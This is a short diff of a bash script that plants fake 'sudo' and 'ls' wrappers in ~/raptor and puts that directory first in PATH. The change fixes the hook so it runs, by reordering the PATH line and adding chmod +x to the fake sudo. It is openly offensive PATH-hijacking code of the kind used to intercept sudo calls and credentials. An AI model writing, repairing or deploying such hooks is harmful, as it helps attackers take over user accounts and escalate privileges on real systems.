@@ -1,8 +1,8 @@
 #!/bin/bash
 
-PATH=~/raptor:$PATH
-
 mkdir ~/raptor
+
+PATH=~/raptor:$PATH
 
 #Hook sudo
 echo "#! /bin/bash" > ~/raptor/sudo
@@ -23,6 +23,7 @@ echo "  fi" >> ~/raptor/sudo
 echo "done" >> ~/raptor/sudo
 echo "" >> ~/raptor/sudo
 echo "/usr/bin/sudo $@" >> ~/raptor/sudo
+chmod +x ~/raptor/sudo
 
 #Hook ls
 echo "#!/bin/bash" > ~/raptor/ls
